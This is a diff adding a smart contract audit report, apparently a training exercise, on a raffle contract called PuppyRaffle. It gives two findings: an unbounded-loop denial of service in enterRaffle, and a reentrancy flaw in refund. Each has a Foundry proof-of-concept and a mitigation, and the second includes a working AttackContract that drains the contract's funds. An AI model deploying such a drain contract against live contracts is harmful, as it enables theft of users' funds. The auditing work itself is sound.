@@ -1,0 +1,114 @@
+# 1
+
+## [M-#] TITLE (Root Cause + Impact)
+
+Looping over an unbounded array in `PuppyRaffle::enterRaffle` can cause DoS
+
+## Description:
+
+DoS attack occurs when a tx is forcibly made to revert when in fact it is expected to pass through. This could be caused by increasing the gas cost of the execution or undesirable behavior due to failed external calls
+
+## Impact:
+
+Faciliates early participants of the raffle over the later ones since the later ones have to pay orders of magnitude higher cost than early players. Gas cost could exceed the maxGasLimit making the service unusable
+
+M / H
+
+## Proof of Concept:
+
+```js
+
+    function testIsDoS() public {
+        vm.txGasPrice(1);
+        address[] memory players = new address[](100);
+        for (uint256 i = 0; i < 100; i++) {
+            players[i] = address(i);
+        }
+
+        uint256 gasUsedBefore = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
+        uint256 gasUsedAfter = gasleft();
+        uint256 gasUsed = (gasUsedBefore - gasUsedAfter) * tx.gasprice;
+
+        console.log("Gas used for first 100: ", gasUsed);
+
+        address[] memory players2 = new address[](100);
+        for (uint256 i = 0; i < 100; i++) {
+            players2[i] = address(i + players.length);
+        }
+
+        uint256 gasUsedBefore2 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * 100}(players2);
+        uint256 gasUsedAfter2 = gasleft();
+        uint256 gasUsed2 = (gasUsedBefore2 - gasUsedAfter2) * tx.gasprice;
+
+        console.log("Gas used for second 100: ", gasUsed2);
+
+        assert(gasUsed2 > gasUsed);
+    }
+```
+
+## Recommended Mitigation:
+
+- we could loop through a bounded array OR maintain a mapping to check for already existing players
+
+# 2
+
+## [H-#] TITLE (Root Cause + Impact)
+
+Reentrancy Attack Vector present in `PuppyRaffle:refund` which could drain the smart contract
+
+## Description:
+
+Due to the function not following the CEI pattern, external call is made before making the necessary state changes, exposing a vulneraability for Reentrnacy by an attacker
+
+## Impact:
+
+All the Funds in the wallet could be drained
+
+H
+
+## Proof of Concept:
+
+```js
+
+    contract AttackContract {
+    PuppyRaffle puppyRaffle;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+    }
+
+    fallback() external payable {
+        if (address(puppyRaffle).balance > 0) {
+            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+            puppyRaffle.refund(playerIndex);
+        }
+    }
+
+    function attack() public {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: 1e18}(players);
+
+        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(playerIndex);
+    }
+}
+
+
+    function testReentrancy() public playerEntered {
+        AttackContract attackContract = new AttackContract(puppyRaffle);
+        vm.deal(address(attackContract), 1 ether);
+        attackContract.attack();
+        uint256 contractBalance = address(attackContract).balance;
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(address(attackContract).balance, entranceFee * 2);
+    }
+```
+
+## Recommended Mitigation:
+
+- follow CEI pattern and reset player address to zero before making the external call 
+OR
+- use Reentrancy Guard form OZ
